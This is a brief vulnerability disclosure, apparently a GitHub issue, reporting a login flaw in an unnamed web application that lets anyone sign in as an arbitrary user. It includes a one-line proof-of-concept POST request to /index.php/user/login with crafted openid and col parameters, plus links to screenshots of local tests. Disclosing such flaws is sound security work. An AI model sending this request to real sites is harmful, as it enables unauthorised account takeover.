That causing any user to login vulnerability  poc：  ``` POST /index.php/user/login  openid=1&col=user_id  ```  Local test results：  [image-20211112113955797](https://user-images.githubusercontent.com/37065209/141429257-24b7cd53-5e97-43a4-aa5b-78b00df7225e.png)  [image-20211112115100091](https://user-images.githubusercontent.com/37065209/141429336-d198bb77-4940-4099-b092-2e09afa116fc.png) |
